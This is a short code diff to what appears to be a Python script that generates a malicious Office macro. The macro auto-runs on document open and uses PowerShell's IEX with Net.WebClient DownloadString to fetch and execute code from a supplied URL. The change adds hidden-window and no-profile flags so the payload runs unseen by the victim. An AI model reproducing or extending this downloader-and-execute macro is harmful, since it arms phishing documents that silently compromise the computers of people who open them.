@@ -22,7 +22,7 @@ macro_payload = macro_name + '.vbs'
 macro = "Sub Auto_Open()\n"
 macro += "   Dim exec As String\n"
 macro += "   Dim payload As String\n"
-macro += """   exec = "powershell.exe ""IEX ((New-Object Net.WebClient).DownloadString"""
+macro += """   exec = "powershell.exe -WindowStyle hidden -nologo -noprofile -c ""IEX ((New-Object Net.WebClient).DownloadString"""
 macro += "('"
 macro += str(url)
 macro += "'))\"\"\"\n"
